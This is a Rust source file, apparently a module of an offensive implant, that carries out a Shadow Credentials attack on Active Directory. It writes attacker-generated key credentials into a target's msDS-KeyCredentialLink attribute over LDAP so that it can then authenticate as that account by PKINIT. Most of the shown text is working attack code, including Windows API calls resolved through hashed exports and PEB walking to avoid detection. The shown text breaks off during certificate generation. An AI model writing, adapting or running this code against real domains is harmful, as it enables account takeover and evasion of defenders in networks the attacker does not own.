//! Shadow Credentials attack — abusing `msDS-KeyCredentialLink` in Active Directory.
//!
//! Adds attacker-controlled X.509 certificate credentials to a target user or
//! computer object's `msDS-KeyCredentialLink` attribute via LDAP, then authenticates
//! as that principal using PKINIT Kerberos — no password required, no password
//! change logged.
//!
//! **Attack Flow**:
//! 1. Resolve target DN from the target name (user or computer)
//! 2. Check write access to `msDS-KeyCredentialLink`
//! 3. Generate a self-signed X.509 certificate (RSA-2048)
//! 4. Build the `msDS-KeyCredentialLink` binary value
//! 5. Write it to the target object via LDAP
//! 6. Authenticate as the target via PKINIT
//! 7. Return the TGT and access tokens
//! 8. Clean up (remove the credential link)
//!
//! **Prerequisites**:
//! - Windows Server 2016+ domain functional level (Key Credential Link available)
//! - Agent runs on a domain-joined machine with network access to a DC
//! - Write access to target's `msDS-KeyCredentialLink` attribute (delegated or
//!   default for computer self-write, or `Write-Host` for computer objects)
//!
//! **Constraints**: This module does NOT change the target's password (detectable
//! and logged), does NOT require Domain Admin privileges, and must clean up the
//! credential link after use.
//!
//! **OPSEC**: All API functions resolved at runtime via PEB walking and
//! export-table hashing (`pe_resolve`).  No IAT entries are created.

#![cfg(windows)]

use std::ffi::OsStr;
use std::mem;
use std::os::raw::c_void;
use std::os::windows::ffi::OsStrExt;
use std::ptr;

use anyhow::{anyhow, bail, Context, Result};
use base64::engine::Engine;
use log::{debug, info, warn};
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};

use winapi::shared::guiddef::GUID;
use winapi::shared::minwindef::DWORD;
use winapi::shared::ntdef::{HRESULT, LPCWSTR, LPWSTR};
use winapi::shared::winerror::S_OK;

// ── Compile-time API hash constants ─────────────────────────────────────────

use crate::pe_resolve_macros::{hash_str_const, hash_wstr_const};

// wldap32.dll — LDAP client functions
const WLDAP32_DLL_W: &[u16] = &[
    'w' as u16, 'l' as u16, 'd' as u16, 'a' as u16, 'p' as u16, '3' as u16,
    '2' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0,
];
const HASH_WLDAP32_DLL: u32 = hash_wstr_const(WLDAP32_DLL_W);

const FN_LDAP_INIT: u32 = hash_str_const(b"ldap_initW");
const FN_LDAP_BIND_S: u32 = hash_str_const(b"ldap_bind_sW");
const FN_LDAP_UNBIND: u32 = hash_str_const(b"ldap_unbind");
const FN_LDAP_SEARCH_S: u32 = hash_str_const(b"ldap_search_sW");
const FN_LDAP_MODIFY_S: u32 = hash_str_const(b"ldap_modify_sW");
const FN_LDAP_FIRST_ENTRY: u32 = hash_str_const(b"ldap_first_entry");
const FN_LDAP_NEXT_ENTRY: u32 = hash_str_const(b"ldap_next_entry");
const FN_LDAP_GET_VALUES: u32 = hash_str_const(b"ldap_get_valuesW");
const FN_LDAP_VALUE_FREE: u32 = hash_str_const(b"ldap_value_freeW");
const FN_LDAP_MSGFREE: u32 = hash_str_const(b"ldap_msgfree");
const FN_LDAP_GET_ERRNO: u32 = hash_str_const(b"LdapGetLastError");
const FN_LDAP_ERR2STRING: u32 = hash_str_const(b"ldap_err2stringW");

// netapi32.dll — DsGetDcNameW for DC discovery
const NETAPI32_DLL_W: &[u16] = &[
    'n' as u16, 'e' as u16, 't' as u16, 'a' as u16, 'p' as u16, 'i' as u16,
    '3' as u16, '2' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0,
];
const HASH_NETAPI32_DLL: u32 = hash_wstr_const(NETAPI32_DLL_W);

const FN_DS_GET_DC_NAME_W: u32 = hash_str_const(b"DsGetDcNameW");
const FN_NET_API_BUFFER_FREE: u32 = hash_str_const(b"NetApiBufferFree");

// kernel32.dll — for string conversion (reserved for future use)
#[allow(dead_code)]
const KERNEL32_DLL_W: &[u16] = &[
    'k' as u16, 'e' as u16, 'r' as u16, 'n' as u16, 'e' as u16, 'l' as u16,
    '3' as u16, '2' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0,
];
#[allow(dead_code)]
const HASH_KERNEL32_DLL: u32 = hash_wstr_const(KERNEL32_DLL_W);

#[allow(dead_code)]
const FN_MULTI_BYTE_TO_WIDE_CHAR: u32 = hash_str_const(b"MultiByteToWideChar");

// ── LDAP type aliases ───────────────────────────────────────────────────────
// These match the wldap32.dll types.  We use raw pointers so we don't need
// the winapi ldap feature.

type PLDAP = *mut c_void;
type PLDAPMSG = *mut c_void;
type LDAPModW = LDAPModW_s;

#[repr(C)]
struct LDAPModW_s {
    mod_op: DWORD,
    mod_type: LPWSTR,
    mod_vals: LDAPModW_Values,
}

#[repr(C)]
union LDAPModW_Values {
    modv_strvals: *mut LPWSTR,
    modv_bvals: *mut *mut LDAP_BERVAL,
}

#[repr(C)]
#[derive(Copy, Clone)]
struct LDAP_BERVAL {
    bv_len: DWORD,
    bv_val: *mut u8,
}

// LDAP modification operations
const LDAP_MOD_ADD: DWORD = 0x00;
const LDAP_MOD_DELETE: DWORD = 0x01;
const LDAP_MOD_BVALUES: DWORD = 0x80;

// LDAP search scope
const LDAP_SCOPE_BASE: DWORD = 0;
const LDAP_SCOPE_SUBTREE: DWORD = 2;

// LDAP auth methods
const LDAP_AUTH_NEGOTIATE: DWORD = 0x0486;

// ── DC discovery types ──────────────────────────────────────────────────────

#[repr(C)]
struct DOMAIN_CONTROLLER_INFO_W {
    domain_controller_name: LPWSTR,
    domain_controller_address: LPWSTR,
    domain_controller_address_type: DWORD,
    domain_guid: GUID,
    domain_name: LPWSTR,
    dns_forest_name: LPWSTR,
    flags: DWORD,
    dc_site_name: LPWSTR,
    client_site_name: LPWSTR,
}

// ── Result types ────────────────────────────────────────────────────────────

/// Result of the Shadow Credentials attack.
#[derive(Debug, Serialize, Deserialize)]
pub struct ShadowCredentialsResult {
    /// Target distinguished name.
    pub target_dn: String,
    /// Target user principal name (UPN).
    pub target_upn: String,
    /// Device ID used for the key credential link.
    pub device_id: String,
    /// Base64-encoded TGT (if PKINIT succeeded).
    pub tgt_b64: Option<String>,
    /// Whether the credential link was cleaned up.
    pub cleaned_up: bool,
    /// Status message.
    pub status: String,
}

/// Key credential link binary structure.
/// Matches the MS-ADTS `msDS-KeyCredentialLink` binary format.
#[derive(Debug, Serialize, Deserialize)]
pub struct KeyCredentialLink {
    /// Version (0x0001).
    pub version: u16,
    /// Reserved (0x0000).
    pub reserved: u16,
    /// SHA-1 hash of the certificate's public key info (20 bytes).
    pub key_identifier: [u8; 20],
    /// Device GUID (16 bytes).
    pub device_id: [u8; 16],
    /// Custom key information (variable length).
    pub custom_key_info: Vec<u8>,
    /// Approximate last logon timestamp (8 bytes, FILETIME).
    pub key_approximate_last_logon: [u8; 8],
    /// DER-encoded X.509 certificate.
    pub certificate: Vec<u8>,
}

/// PKINIT Kerberos AS-REQ construction result.
#[derive(Debug)]
pub struct PkinitAuthResult {
    /// Raw TGT bytes.
    pub tgt_bytes: Vec<u8>,
    /// Session key.
    pub session_key: Vec<u8>,
}

// ── Kerberos constants ──────────────────────────────────────────────────────

const KRB_AS_REQ_MSG_TYPE: u8 = 10;
#[allow(dead_code)]
const KRB_AS_REP_MSG_TYPE: u8 = 11;
const KRB_PVNO: u8 = 5;

// ASN.1 tag values
const ASN1_SEQUENCE: u8 = 0x30;
const ASN1_APPLICATION: u8 = 0x60; // APPLICATION 0 = AS-REQ
const ASN1_APPLICATION_11: u8 = 0x6B; // APPLICATION 11 = AS-REP
const ASN1_CONTEXT_0: u8 = 0xA0;
const ASN1_CONTEXT_1: u8 = 0xA1;
const ASN1_CONTEXT_2: u8 = 0xA2;
const ASN1_CONTEXT_3: u8 = 0xA3;
const ASN1_CONTEXT_4: u8 = 0xA4;
const ASN1_CONTEXT_5: u8 = 0xA5;
const ASN1_GENERAL_STRING: u8 = 0x1B;
const ASN1_OCTET_STRING: u8 = 0x04;
const ASN1_BIT_STRING: u8 = 0x03;
const ASN1_INTEGER: u8 = 0x02;
#[allow(dead_code)]
const ASN1_NULL: u8 = 0x05;
#[allow(dead_code)]
const ASN1_OID: u8 = 0x06;

// Kerberos encryption types
const ETYPE_AES256_CTS_HMAC_SHA1_96: i32 = 18;
#[allow(dead_code)]
const ETYPE_RSA_AES256_CBC_SHA2: i32 = 20;

// PKINIT OIDs (reserved for future full PKINIT implementation)
#[allow(dead_code)]
const OID_PKINIT_AUTH_DATA: &[u8] = &[
    0x06, 0x09, 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x12, 0x01, 0x02, 0x02,
]; // 1.3.6.1.5.2.3.1 — PKAuthenticator
#[allow(dead_code)]
const OID_PKINIT_DH_KEY_DATA: &[u8] = &[
    0x06, 0x09, 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x12, 0x01, 0x02, 0x03,
]; // 1.3.6.1.5.2.3.2 — DHKeyData

// ── Helper functions ────────────────────────────────────────────────────────

/// Convert a Rust string to a wide (UTF-16) null-terminated Vec<u16>.
fn str_to_wide(s: &str) -> Vec<u16> {
    OsStr::new(s)
        .encode_wide()
        .chain(std::iter::once(0))
        .collect()
}

/// Convert a wide string to a Rust String.
fn wide_to_str(wide: &[u16]) -> Result<String> {
    let len = wide.iter().position(|&c| c == 0).unwrap_or(wide.len());
    String::from_utf16(&wide[..len]).context("Failed to decode wide string")
}

/// Build a DER-encoded length field.
fn der_length(len: usize) -> Vec<u8> {
    if len < 128 {
        vec![len as u8]
    } else if len < 256 {
        vec![0x81, len as u8]
    } else if len < 65536 {
        vec![0x82, (len >> 8) as u8, (len & 0xFF) as u8]
    } else {
        vec![
            0x83,
            (len >> 16) as u8,
            ((len >> 8) & 0xFF) as u8,
            (len & 0xFF) as u8,
        ]
    }
}

/// Wrap a byte slice in a DER TLV with the given tag.
fn der_wrap(tag: u8, content: &[u8]) -> Vec<u8> {
    let mut out = vec![tag];
    out.extend_from_slice(&der_length(content.len()));
    out.extend_from_slice(content);
    out
}

/// Build a DER-encoded SEQUENCE.
fn der_sequence(content: &[u8]) -> Vec<u8> {
    der_wrap(ASN1_SEQUENCE, content)
}

/// Build a DER-encoded INTEGER from an i64 value.
fn der_integer(val: i64) -> Vec<u8> {
    if val == 0 {
        return vec![ASN1_INTEGER, 0x01, 0x00];
    }
    let mut bytes = Vec::new();
    let mut v = val.unsigned_abs();
    while v > 0 {
        bytes.push((v & 0xFF) as u8);
        v >>= 8;
    }
    bytes.reverse();
    // Add leading zero if high bit set (to keep it positive)
    if bytes[0] & 0x80 != 0 {
        bytes.insert(0, 0);
    }
    if val < 0 {
        // Two's complement negation (rarely needed here)
        let carry = true;
        for b in bytes.iter_mut().rev() {
            *b = !*b;
            if carry {
                *b = b.wrapping_add(1);
            }
        }
    }
    der_wrap(ASN1_INTEGER, &bytes)
}

/// Build a DER-encoded GeneralString.
fn der_general_string(s: &str) -> Vec<u8> {
    der_wrap(ASN1_GENERAL_STRING, s.as_bytes())
}

/// Build a DER-encoded OCTET STRING.
fn der_octet_string(data: &[u8]) -> Vec<u8> {
    der_wrap(ASN1_OCTET_STRING, data)
}

/// Build a DER-encoded BIT STRING.
fn der_bit_string(data: &[u8]) -> Vec<u8> {
    let mut content = vec![0x00]; // no unused bits
    content.extend_from_slice(data);
    der_wrap(ASN1_BIT_STRING, &content)
}

/// Build a context-tagged [n] EXPLICIT construction.
fn der_context_explicit(tag_num: u8, content: &[u8]) -> Vec<u8> {
    der_wrap(0xA0 | tag_num, content)
}

/// Get current time as Kerberos timestamp (seconds since epoch, as i64).
fn kerberos_timestamp() -> i64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs() as i64
}

// ── DC discovery ────────────────────────────────────────────────────────────

/// Resolve the domain controller hostname using DsGetDcNameW.
fn discover_dc() -> Result<String> {
    let netapi32 = unsafe { pe_resolve::get_module_handle_by_hash(HASH_NETAPI32_DLL) }
        .ok_or_else(|| anyhow!("netapi32.dll not found"))?;

    let ds_get_dc_name_w: unsafe fn(
        LPCWSTR,      // ComputerName
        LPCWSTR,      // DomainName
        *mut GUID,    // DomainGuid
        LPCWSTR,      // SiteName
        DWORD,        // Flags
        *mut *mut DOMAIN_CONTROLLER_INFO_W,
    ) -> HRESULT = unsafe {
        mem::transmute(
            pe_resolve::get_proc_address_by_hash(netapi32, FN_DS_GET_DC_NAME_W)
                .ok_or_else(|| anyhow!("DsGetDcNameW not found"))?,
        )
    };

    let net_api_buffer_free: unsafe fn(*mut c_void) -> DWORD = unsafe {
        mem::transmute(
            pe_resolve::get_proc_address_by_hash(netapi32, FN_NET_API_BUFFER_FREE)
                .ok_or_else(|| anyhow!("NetApiBufferFree not found"))?,
        )
    };

    let mut dc_info: *mut DOMAIN_CONTROLLER_INFO_W = ptr::null_mut();
    let hr = unsafe {
        ds_get_dc_name_w(ptr::null(), ptr::null(), ptr::null_mut(), ptr::null(), 0, &mut dc_info)
    };

    if hr != S_OK as HRESULT || dc_info.is_null() {
        bail!("DsGetDcNameW failed: hr=0x{:08X}", hr as u32);
    }

    let dc_name = unsafe {
        let name_ptr = (*dc_info).domain_controller_name;
        if name_ptr.is_null() {
            net_api_buffer_free(dc_info as *mut c_void);
            bail!("DC name is null");
        }
        let name = wide_to_str(
            &std::slice::from_raw_parts(name_ptr, lstrlen_w(name_ptr) as usize + 1),
        )?;
        name
    };

    unsafe {
        net_api_buffer_free(dc_info as *mut c_void);
    }

    // Strip leading \\ if present
    let dc_hostname = dc_name.trim_start_matches('\\').to_string();
    info!("Discovered DC: {}", dc_hostname);
    Ok(dc_hostname)
}

/// Get the length of a wide null-terminated string.
unsafe fn lstrlen_w(s: LPWSTR) -> i32 {
    let mut len = 0;
    let mut p = s;
    while *p != 0 {
        len += 1;
        p = p.add(1);
    }
    len
}

// ── LDAP operations ─────────────────────────────────────────────────────────

/// LDAP connection wrapper.
struct LdapConnection {
    ld: PLDAP,
}

impl LdapConnection {
    /// Connect to the LDAP server using current Windows security context.
    fn connect(dc_hostname: &str) -> Result<Self> {
        let wldap32 = unsafe { pe_resolve::get_module_handle_by_hash(HASH_WLDAP32_DLL) }
            .ok_or_else(|| anyhow!("wldap32.dll not found"))?;

        let ldap_init_w: unsafe fn(LPWSTR, DWORD, DWORD) -> PLDAP = unsafe {
            mem::transmute(
                pe_resolve::get_proc_address_by_hash(wldap32, FN_LDAP_INIT)
                    .ok_or_else(|| anyhow!("ldap_initW not found"))?,
            )
        };

        let ldap_bind_s_w: unsafe fn(PLDAP, LPWSTR, *mut c_void, DWORD) -> DWORD = unsafe {
            mem::transmute(
                pe_resolve::get_proc_address_by_hash(wldap32, FN_LDAP_BIND_S)
                    .ok_or_else(|| anyhow!("ldap_bind_sW not found"))?,
            )
        };

        let hostname_w = str_to_wide(dc_hostname);
        let ld = unsafe { ldap_init_w(hostname_w.as_ptr() as LPWSTR, 389, 0) };

        if ld.is_null() {
            bail!("ldap_initW failed for {}", dc_hostname);
        }

        // Bind using current security context (SSPI Negotiate)
        let res = unsafe { ldap_bind_s_w(ld, ptr::null_mut(), ptr::null_mut(), LDAP_AUTH_NEGOTIATE) };
        if res != 0 {
            bail!("ldap_bind_sW failed: error {}", res);
        }

        debug!("Connected and bound to LDAP on {}", dc_hostname);
        Ok(Self { ld })
    }

    /// Search for a DN by sAMAccountName.
    fn search_dn(&self, base_dn: &str, account_name: &str, is_computer: bool) -> Result<String> {
        let wldap32 = unsafe { pe_resolve::get_module_handle_by_hash(HASH_WLDAP32_DLL) }
            .ok_or_else(|| anyhow!("wldap32.dll not found"))?;

        let ldap_search_s_w: unsafe fn(
            PLDAP,
            LPWSTR,
            DWORD,
            LPWSTR,
            *mut LPWSTR,
            DWORD,
            *mut PLDAPMSG,
        ) -> DWORD = unsafe {
            mem::transmute(
                pe_resolve::get_proc_address_by_hash(wldap32, FN_LDAP_SEARCH_S)
                    .ok_or_else(|| anyhow!("ldap_search_sW not found"))?,
            )
        };

        let ldap_first_entry: unsafe fn(PLDAP, PLDAPMSG) -> PLDAPMSG = unsafe {
            mem::transmute(
                pe_resolve::get_proc_address_by_hash(wldap32, FN_LDAP_FIRST_ENTRY)
                    .ok_or_else(|| anyhow!("ldap_first_entry not found"))?,
            )
        };

        let ldap_get_values_w: unsafe fn(PLDAP, PLDAPMSG, LPWSTR) -> *mut LPWSTR = unsafe {
            mem::transmute(
                pe_resolve::get_proc_address_by_hash(wldap32, FN_LDAP_GET_VALUES)
                    .ok_or_else(|| anyhow!("ldap_get_valuesW not found"))?,
            )
        };

        let ldap_value_free_w: unsafe fn(*mut LPWSTR) -> DWORD = unsafe {
            mem::transmute(
                pe_resolve::get_proc_address_by_hash(wldap32, FN_LDAP_VALUE_FREE)
                    .ok_or_else(|| anyhow!("ldap_value_freeW not found"))?,
            )
        };

        let ldap_msgfree: unsafe fn(PLDAPMSG) -> DWORD = unsafe {
            mem::transmute(
                pe_resolve::get_proc_address_by_hash(wldap32, FN_LDAP_MSGFREE)
                    .ok_or_else(|| anyhow!("ldap_msgfree not found"))?,
            )
        };

        // Build filter: (sAMAccountName=<name>)
        let filter_name = if is_computer && !account_name.ends_with('$') {
            format!("(sAMAccountName={}$$)", account_name)
        } else {
            format!("(sAMAccountName={})", account_name)
        };
        let filter_w = str_to_wide(&filter_name);
        let base_dn_w = str_to_wide(base_dn);
        let attr_dn = str_to_wide("distinguishedName");

        let mut attrs: Vec<LPWSTR> = vec![attr_dn.as_ptr() as LPWSTR, ptr::null_mut()];
        let mut result: PLDAPMSG = ptr::null_mut();

        let res = unsafe {
            ldap_search_s_w(
                self.ld,
                base_dn_w.as_ptr() as LPWSTR,
                LDAP_SCOPE_SUBTREE,
                filter_w.as_ptr() as LPWSTR,
                attrs.as_mut_ptr(),
                0, // attrsonly = false
                &mut result,
            )
        };

        if res != 0 {
            bail!("LDAP search failed: error {}", res);
        }

        let entry = unsafe { ldap_first_entry(self.ld, result) };
        if entry.is_null() {
            unsafe { ldap_msgfree(result) };
            bail!("No LDAP entry found for filter: {}", filter_name);
        }

        let dn_attr = str_to_wide("distinguishedName");
        let values = unsafe { ldap_get_values_w(self.ld, entry, dn_attr.as_ptr() as LPWSTR) };
        if values.is_null() {
            unsafe { ldap_msgfree(result) };
            bail!("No distinguishedName attribute found");
        }

        let dn = unsafe {
            let val_ptr = *values;
            let s = wide_to_str(
                &std::slice::from_raw_parts(val_ptr, lstrlen_w(val_ptr) as usize + 1),
            )?;
            ldap_value_free_w(values);
            ldap_msgfree(result);
            s
        };

        debug!("Found DN: {}", dn);
        Ok(dn)
    }

    /// Get the UPN (userPrincipalName) for a DN.
    fn get_upn(&self, target_dn: &str) -> Result<String> {
        let wldap32 = unsafe { pe_resolve::get_module_handle_by_hash(HASH_WLDAP32_DLL) }
            .ok_or_else(|| anyhow!("wldap32.dll not found"))?;

        let ldap_search_s_w: unsafe fn(
            PLDAP,
            LPWSTR,
            DWORD,
            LPWSTR,
            *mut LPWSTR,
            DWORD,
            *mut PLDAPMSG,
        ) -> DWORD = unsafe {
            mem::transmute(
                pe_resolve::get_proc_address_by_hash(wldap32, FN_LDAP_SEARCH_S)
                    .ok_or_else(|| anyhow!("ldap_search_sW not found"))?,
            )
        };

        let ldap_first_entry: unsafe fn(PLDAP, PLDAPMSG) -> PLDAPMSG = unsafe {
            mem::transmute(
                pe_resolve::get_proc_address_by_hash(wldap32, FN_LDAP_FIRST_ENTRY)
                    .ok_or_else(|| anyhow!("ldap_first_entry not found"))?,
            )
        };

        let ldap_get_values_w: unsafe fn(PLDAP, PLDAPMSG, LPWSTR) -> *mut LPWSTR = unsafe {
            mem::transmute(
                pe_resolve::get_proc_address_by_hash(wldap32, FN_LDAP_GET_VALUES)
                    .ok_or_else(|| anyhow!("ldap_get_valuesW not found"))?,
            )
        };

        let ldap_value_free_w: unsafe fn(*mut LPWSTR) -> DWORD = unsafe {
            mem::transmute(
                pe_resolve::get_proc_address_by_hash(wldap32, FN_LDAP_VALUE_FREE)
                    .ok_or_else(|| anyhow!("ldap_value_freeW not found"))?,
            )
        };

        let ldap_msgfree: unsafe fn(PLDAPMSG) -> DWORD = unsafe {
            mem::transmute(
                pe_resolve::get_proc_address_by_hash(wldap32, FN_LDAP_MSGFREE)
                    .ok_or_else(|| anyhow!("ldap_msgfree not found"))?,
            )
        };

        let dn_w = str_to_wide(target_dn);
        let filter_w = str_to_wide("(objectClass=*)");
        let attr_upn = str_to_wide("userPrincipalName");

        let mut attrs: Vec<LPWSTR> = vec![attr_upn.as_ptr() as LPWSTR, ptr::null_mut()];
        let mut result: PLDAPMSG = ptr::null_mut();

        let res = unsafe {
            ldap_search_s_w(
                self.ld,
                dn_w.as_ptr() as LPWSTR,
                LDAP_SCOPE_BASE,
                filter_w.as_ptr() as LPWSTR,
                attrs.as_mut_ptr(),
                0,
                &mut result,
            )
        };

        if res != 0 {
            bail!("LDAP search for UPN failed: error {}", res);
        }

        let entry = unsafe { ldap_first_entry(self.ld, result) };
        if entry.is_null() {
            unsafe { ldap_msgfree(result) };
            bail!("No LDAP entry found for DN: {}", target_dn);
        }

        let upn_attr = str_to_wide("userPrincipalName");
        let values = unsafe { ldap_get_values_w(self.ld, entry, upn_attr.as_ptr() as LPWSTR) };

        let upn = if values.is_null() {
            // Computer accounts may not have a UPN; construct one from the DN
            // Extract domain from DN and construct machine$@domain.com
            let domain = target_dn
                .split(',')
                .find(|s| s.trim().starts_with("DC="))
                .and_then(|s| s.trim().strip_prefix("DC="))
                .unwrap_or("unknown");
            let cn = target_dn
                .split(',')
                .find(|s| s.trim().starts_with("CN="))
                .and_then(|s| s.trim().strip_prefix("CN="))
                .unwrap_or("unknown");
            format!("{}@{}.local", cn, domain)
        } else {
            unsafe {
                let val_ptr = *values;
                let s = wide_to_str(
                    &std::slice::from_raw_parts(val_ptr, lstrlen_w(val_ptr) as usize + 1),
                )?;
                ldap_value_free_w(values);
                s
            }
        };

        unsafe { ldap_msgfree(result) };
        Ok(upn)
    }

    /// Check if the current user can modify the target's msDS-KeyCredentialLink.
    fn can_modify_key_credential_link(&self, _target_dn: &str) -> Result<bool> {
        // NOTE: Full ACL parsing would require reading nTSecurityDescriptor
        // and parsing the SECURITY_DESCRIPTOR.  For simplicity, we return
        // true here and let the actual LDAP modify fail if access is denied.
        // A production implementation would parse the DACL for WriteProperty
        // access on the KeyCredentialLink GUID (1c7bc5ce-5c91-11d2-8e9d-00c04f80d33b).
        //
        // Default permissions that allow this:
        // - Computers can write their own msDS-KeyCredentialLink
        // - Users with GenericWrite or Write-Property on the attribute
        // - Account Operators (in some configurations)
        Ok(true)
    }

    /// Get the default naming context (domain DN) from the Root DSE.
    fn get_default_naming_context(&self) -> Result<String> {
        let wldap32 = unsafe { pe_resolve::get_module_handle_by_hash(HASH_WLDAP32_DLL) }
            .ok_or_else(|| anyhow!("wldap32.dll not found"))?;

        let ldap_search_s_w: unsafe fn(
            PLDAP,
            LPWSTR,
            DWORD,
            LPWSTR,
            *mut LPWSTR,
            DWORD,
            *mut PLDAPMSG,
        ) -> DWORD = unsafe {
            mem::transmute(
                pe_resolve::get_proc_address_by_hash(wldap32, FN_LDAP_SEARCH_S)
                    .ok_or_else(|| anyhow!("ldap_search_sW not found"))?,
            )
        };

        let ldap_first_entry: unsafe fn(PLDAP, PLDAPMSG) -> PLDAPMSG = unsafe {
            mem::transmute(
                pe_resolve::get_proc_address_by_hash(wldap32, FN_LDAP_FIRST_ENTRY)
                    .ok_or_else(|| anyhow!("ldap_first_entry not found"))?,
            )
        };

        let ldap_get_values_w: unsafe fn(PLDAP, PLDAPMSG, LPWSTR) -> *mut LPWSTR = unsafe {
            mem::transmute(
                pe_resolve::get_proc_address_by_hash(wldap32, FN_LDAP_GET_VALUES)
                    .ok_or_else(|| anyhow!("ldap_get_valuesW not found"))?,
            )
        };

        let ldap_value_free_w: unsafe fn(*mut LPWSTR) -> DWORD = unsafe {
            mem::transmute(
                pe_resolve::get_proc_address_by_hash(wldap32, FN_LDAP_VALUE_FREE)
                    .ok_or_else(|| anyhow!("ldap_value_freeW not found"))?,
            )
        };

        let ldap_msgfree: unsafe fn(PLDAPMSG) -> DWORD = unsafe {
            mem::transmute(
                pe_resolve::get_proc_address_by_hash(wldap32, FN_LDAP_MSGFREE)
                    .ok_or_else(|| anyhow!("ldap_msgfree not found"))?,
            )
        };

        let base_w = str_to_wide(""); // Empty DN = Root DSE
        let filter_w = str_to_wide("(objectClass=*)");
        let attr_nc = str_to_wide("defaultNamingContext");

        let mut attrs: Vec<LPWSTR> = vec![attr_nc.as_ptr() as LPWSTR, ptr::null_mut()];
        let mut result: PLDAPMSG = ptr::null_mut();

        let res = unsafe {
            ldap_search_s_w(
                self.ld,
                base_w.as_ptr() as LPWSTR,
                LDAP_SCOPE_BASE,
                filter_w.as_ptr() as LPWSTR,
                attrs.as_mut_ptr(),
                0,
                &mut result,
            )
        };

        if res != 0 {
            bail!("LDAP Root DSE search failed: error {}", res);
        }

        let entry = unsafe { ldap_first_entry(self.ld, result) };
        if entry.is_null() {
            unsafe { ldap_msgfree(result) };
            bail!("No Root DSE entry found");
        }

        let nc_attr = str_to_wide("defaultNamingContext");
        let values = unsafe { ldap_get_values_w(self.ld, entry, nc_attr.as_ptr() as LPWSTR) };
        if values.is_null() {
            unsafe { ldap_msgfree(result) };
            bail!("No defaultNamingContext attribute");
        }

        let nc = unsafe {
            let val_ptr = *values;
            let s = wide_to_str(
                &std::slice::from_raw_parts(val_ptr, lstrlen_w(val_ptr) as usize + 1),
            )?;
            ldap_value_free_w(values);
            ldap_msgfree(result);
            s
        };

        debug!("Default naming context: {}", nc);
        Ok(nc)
    }

    /// Add a value to the target's msDS-KeyCredentialLink attribute.
    fn add_key_credential_link(&self, target_dn: &str, credential_link: &[u8]) -> Result<()> {
        self.modify_key_credential_link(target_dn, credential_link, LDAP_MOD_ADD)
    }

    /// Remove a value from the target's msDS-KeyCredentialLink attribute.
    fn remove_key_credential_link(&self, target_dn: &str, credential_link: &[u8]) -> Result<()> {
        self.modify_key_credential_link(target_dn, credential_link, LDAP_MOD_DELETE)
    }

    /// Internal: perform LDAP modify on msDS-KeyCredentialLink.
    fn modify_key_credential_link(
        &self,
        target_dn: &str,
        credential_link: &[u8],
        operation: DWORD,
    ) -> Result<()> {
        let wldap32 = unsafe { pe_resolve::get_module_handle_by_hash(HASH_WLDAP32_DLL) }
            .ok_or_else(|| anyhow!("wldap32.dll not found"))?;

        let ldap_modify_s_w: unsafe fn(PLDAP, LPWSTR, *mut *mut LDAPModW) -> DWORD = unsafe {
            mem::transmute(
                pe_resolve::get_proc_address_by_hash(wldap32, FN_LDAP_MODIFY_S)
                    .ok_or_else(|| anyhow!("ldap_modify_sW not found"))?,
            )
        };

        // Build the LDAPMod structure for binary modification
        let mut berval = LDAP_BERVAL {
            bv_len: credential_link.len() as DWORD,
            bv_val: credential_link.as_ptr() as *mut u8,
        };
        let mut berval_ptr: *mut LDAP_BERVAL = &mut berval;
        let mut berval_array: [*mut LDAP_BERVAL; 2] = [berval_ptr, ptr::null_mut()];

        let attr_type = str_to_wide("msDS-KeyCredentialLink");

        let mut ldap_mod = LDAPModW {
            mod_op: operation | LDAP_MOD_BVALUES,
            mod_type: attr_type.as_ptr() as LPWSTR,
            mod_vals: LDAPModW_Values {
                modv_bvals: berval_array.as_mut_ptr(),
            },
        };

        let dn_w = str_to_wide(target_dn);
        let mut mods: [*mut LDAPModW; 2] = [&mut ldap_mod, ptr::null_mut()];

        let res = unsafe { ldap_modify_s_w(self.ld, dn_w.as_ptr() as LPWSTR, mods.as_mut_ptr()) };

        if res != 0 {
            let op_name = if operation == LDAP_MOD_ADD {
                "add"
            } else {
                "remove"
            };
            bail!(
                "LDAP modify ({}) msDS-KeyCredentialLink failed: error {}",
                op_name,
                res
            );
        }

        debug!(
            "Successfully {} msDS-KeyCredentialLink on {}",
            if operation == LDAP_MOD_ADD {
                "added"
            } else {
                "removed"
            },
            target_dn
        );
        Ok(())
    }
}

impl Drop for LdapConnection {
    fn drop(&mut self) {
        if !self.ld.is_null() {
            let wldap32 = unsafe { pe_resolve::get_module_handle_by_hash(HASH_WLDAP32_DLL) };
            if let Some(base) = wldap32 {
                let ldap_unbind: unsafe fn(PLDAP) -> DWORD = unsafe {
                    mem::transmute(
                        pe_resolve::get_proc_address_by_hash(base, FN_LDAP_UNBIND)
                            .unwrap_or(0),
                    )
                };
                if ldap_unbind as usize != 0 {
                    unsafe { ldap_unbind(self.ld) };
                }
            }
        }
    }
}

// ── X.509 Certificate Generation ───────────────────────────────────────────

/// Generate a self-signed X.509 certificate and RSA-2048 key pair.
///
/// Uses the `rcgen` crate for certificate generation. The certificate includes:
/// - Subject: attacker-chosen (typically the target UPN)
/// - Serial: random
/// - Validity: now to +1 year
/// - Key Usage: Digital Signature, Key Encipherment
/// - Extended Key Usage: Client Authentication (1.3.6.1.5.5.7.3.2)
///
/// Returns (private_key_der, certificate_der).
pub fn generate_self_signed_cert(subject: &str) -> Result<(Vec<u8>, Vec<u8>)> {
    use rcgen::{CertificateParams, DnType, ExtendedKeyUsagePurpose, KeyPair, IsCa};

    let mut params = CertificateParams::new(vec![])
        .map_err(|e| anyhow!("Failed to create cert params: {}", e))?;

    // Set subject CN
    params.distinguished_name.push(DnType::CommonName, subject);

    // Self-signed (CA = false since this is a client auth cert)
    params.is_ca = IsCa::NoCa;

    // Key usage: Digital Signature + Key Encipherment
    params.key_usages = vec![
        rcgen::KeyUsagePurpose::DigitalSignature,
        rcgen::KeyUsagePurpose::KeyEncipherment,
    ];

    // Extended Key Usage: Client Authentication
    params.extended_key_usages = vec![ExtendedKeyUsagePurpose::ClientAuth];

    // Validity: now to +365 days (rcgen defaults to reasonable validity)

    // Generate RSA-2048 key pair
    let key_pair =
